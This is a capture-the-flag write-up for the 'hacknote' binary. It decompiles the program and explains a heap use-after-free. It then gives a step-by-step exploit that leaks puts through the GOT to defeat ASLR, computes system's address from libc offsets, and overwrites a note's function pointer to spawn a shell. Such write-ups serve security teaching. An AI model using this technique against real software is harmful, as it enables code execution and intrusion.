
┌─────────────┬───────────────────────────[ hacknote Writeup ]──────────────────────────────────────────
| Description |
└─────────────┘
Leverage pwninit to get the correct ld 
wget -O pwninit https://github.com/io12/pwninit/releases/download/3.3.0/pwninit
chmod +x pwninit
./pwninit --bin hacknote --libc libc.so.6

For debugging to find main - find entry point using info file
x/20i <entry point>
Look for the call <addr> (this is __libc_start_main)
continue into it. the argument for main's addr is an arg

Decompile

main() { 
  int iVar1;                                                 // choice input as integer
  int in_GS_OFFSET;
  char local_18 [4];                                         // choice input for read - char array
  undefined4 local_14;                                       // canary
  undefined1 *puStack_c;
  puStack_c = &stack0x00000004;
  local_14 = *(undefined4 *)(in_GS_OFFSET + 0x14);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  do {
    while( true ) {
      while( true ) {
        print_instr();                                       // Prints instructions to console
        read(0,local_18,4);                                  // read input into local_18 
        iVar1 = atoi(local_18);                              // set input into iVar1
        if (iVar1 != 2) break;
        delete_note();                                       // If 'delete note' then call delete_note() 
      }
      if (2 < iVar1) break;
      if (iVar1 == 1) {
        add_note();                                          // If 'add note' then call add_note()
      }
      else {
LAB_08048a96:
        puts("Invalid choice");
      }
    }
    if (iVar1 != 3) {
      if (iVar1 == 4) {
        exit(0);                                             // If 'exit' then exit
      }
      goto LAB_08048a96;
    }
    print_note();                                            // If 'print note' then call print_note()
  } while( true );
}


struct Note {
  void *funcptr;  (FUN_0804862b) [4 bytes]
  char *content;                 [4 bytes]
};
FUN_0804862b(int param_1) {                                  // Simply prints out content
  puts(*(char **)(param_1 + 4));
  return;
}


delete_note() {
  int iVar1;                                                 // integer of note to delete
  int in_GS_OFFSET;
  char local_14 [4];                                         // input of note to delete
  int local_10;
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  printf("Index :");
  read(0,local_14,4);                                        // input of note to delete 
  iVar1 = atoi(local_14);                                    // iVar1 is input of note to delete
  if ((iVar1 < 0) || (note_count <= iVar1)) {                // check boundary of note to delete
    puts("Out of bound!");
    _exit(0);
  }
  if (*(int *)(&note_array + iVar1 * 4) != 0) {              // if note_array at index to delete is not null
    free(*(void **)(*(int *)(&note_array + iVar1 * 4) + 4)); // free note's funcptr
    free(*(void **)(&note_array + iVar1 * 4));               // free note's value
    puts("Success");
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {           // canary check
    __stack_chk_fail();
  }
  return;
}


add_note() {
  int iVar1;
  void *pvVar2;                                              // pointer to allocated memory
  size_t __size;                                             // note size input integer
  int in_GS_OFFSET;
  int local_20;                                              // loop index
  char local_18 [8];                                         // note size input
  int local_10;                                              // canary
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  if (note_count < 6) {                                      // max of 5 elements in note_array
    for (local_20 = 0; local_20 < 5; local_20 = local_20 + 1) {
      if (*(int *)(&note_array + local_20 * 4) == 0) {       // if there is an open space in note_array 
        pvVar2 = malloc(8);                                  // allocate 8 bytes into pvVar2
        *(void **)(&note_array + local_20 * 4) = pvVar2;     // set note_array[local_20] = pvVar2
        if (*(int *)(&note_array + local_20 * 4) == 0) {     // failed to allocated
          puts("Alloca Error");
          exit(-1);
        }
        **(undefined4 **)(&note_array + local_20 * 4) = FUN_0804862b;  // set allocated value note_array[local_20] to FUN_0804862b
        printf("Note size :");
        read(0,local_18,8);                                  // input of note size
        __size = atoi(local_18);                             // input of note size to integer __size
        iVar1 = *(int *)(&note_array + local_20 * 4);
        pvVar2 = malloc(__size);                             // allocate __size amount
        *(void **)(iVar1 + 4) = pvVar2;                      // note_array[local_20] + 4 = pvVar (content pointer)
        if (*(int *)(*(int *)(&note_array + local_20 * 4) + 4) == 0) {  
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");                                 // read in content directly into *note_array[local_20]+4
        read(0,*(void **)(*(int *)(&note_array + local_20 * 4) + 4),__size);  
        puts("Success !");
        note_count = note_count + 1;
        break;
      }
    }
  }
  else {
    puts("Full");
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail();
  }
  return;
}


print_note() {
  int iVar1;                                                 // integer of input of note to print
  int in_GS_OFFSET;
  char local_14 [4];                                         // input of note to print
  int local_10;                                              // canary
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  printf("Index :");
  read(0,local_14,4);                                        // get index of note to print into local_14
  iVar1 = atoi(local_14);                                    // set iVar1 to note to print
  if ((iVar1 < 0) || (note_count <= iVar1)) {                // check note to print is within bounds
    puts("Out of bound!");
    _exit(0);
  }
  if (*(int *)(&note_array + iVar1 * 4) != 0) {              // if note_array[i] != 0, call the funcptr
    (*(code *)**(undefined4 **)(&note_array + iVar1 * 4))
              (*(undefined4 *)(&note_array + iVar1 * 4));
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {           // canary check
    __stack_chk_fail();
  }
  return;
}


┌─────────┐
| Exploit |
└─────────┘
Canary, NX, ASLR

When a note is added, a note struct with two fields, 1st is funcptr (for printing) and 2nd is content buffer
heap chunks after adding 2 notes with content size of 16 bytes
Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0804b008     2b 86 04 08 18 b0 04 08 00 00 00 00 19 00 00 00    +...............]
Chunk(addr=0x804b018, size=0x18, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0804b018     41 41 41 0a 00 00 00 00 00 00 00 00 00 00 00 00    AAA.............]
Chunk(addr=0x804b030, size=0x10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0804b030     2b 86 04 08 40 b0 04 08 00 00 00 00 19 00 00 00    +...@...........]
Chunk(addr=0x804b040, size=0x18, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0804b040     42 42 42 0a 00 00 00 00 00 00 00 00 00 00 00 00    BBB.............]
Chunk(addr=0x804b058, size=0x20fb0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk

0x804b000:      0x00000000      0x00000011      0x0804862b      0x0804b018
0x804b010:      0x00000000      0x00000019      0x0a414141      0x00000000
0x804b020:      0x00000000      0x00000000      0x00000000      0x00000011
0x804b030:      0x0804862b      0x0804b040      0x00000000      0x00000019
0x804b040:      0x0a424242      0x00000000      0x00000000      0x00000000

After notes 0 & 1 have been freed, the fastbins look as follows
Fastbins[idx=0, size=0x10]  
Chunk(addr=0x804b030, size=0x10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) Note 1 
Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) Note 0 
Fastbins[idx=1, size=0x18]
Chunk(addr=0x804b040, size=0x18, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) Note 1 content
Chunk(addr=0x804b018, size=0x18, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) Note 0 content

By adding a 3rd note (note 2) and content of 8 bytes, 0x804b030 (Note 1) becomes Note 2 and 0x804b008 (Note 0) becomes Note 2 
content. Because the pointers are not cleared UAF exists. Thus Note 2 content which we directly control allows us to directly
affect Note 0 content - both the funcptr and the content buffer. Printing which calls the funcptr will therefore execute first 4 
bytes of the content of Note 2.
0x804b000:      0x00000000      0x00000011      0x43434343      0x0a434343
0x804b010:      0x00000000      0x00000019      0x00000000      0x00000000
0x804b020:      0x00000000      0x00000000      0x00000000      0x00000011
0x804b030:      0x0804862b      0x0804b008      0x00000000      0x00000019

The reason that there must be 2 Notes added before deleted is that the 0x10 fastbin must hold at least 2 chunks. 
This is so that the first chunk when adding a note will be the note struct itself (funcptr, content ptr) and the 
second chunk will be the note content. Specifically we need to manuevere allocation so that a note heap content points to
the same address as the functpr.

To beat ASLR and pop shell a leak is required for the address to system. Once again abusing UAF, Note 0 can be set so that
the funcptr to print is the same while content is set to puts@GOT. This will leak the actual runtime address of the puts function
in libc. Using this with known offsets in libc, we can find the address of system

0804a024 puts@GLIBC_2.0
0804862b print funcptr
$ readelf -s libc.so.6 | grep puts
   434: 0005f140   464 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.0
$ readelf -s libc.so.6 | grep system
  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
libc_base = leak - 0x5f140
system_addr = libc_base + 0x3a940

Exploit:
1                             // Add Note 0
16
AAAA
1                             // Add Note 1
16
BBBB
2                             // Delete Note 0
0
2                             // Delete Note 1
1
1                             // Add Note 2
8
<print funcptr> <puts@GOT>
3                             // Print Note 0 (Leak puts addr)
0 
2                             // Delete Note 2 
2
1                             // Add Note 3 (overwrite functpr to system and pop shell)
8
<system_addr> <;sh;>
3                             // Print Note 0 (Pops shell)
0


FLAG{Us3_aft3r_fl3333_in_h4ck_not3}
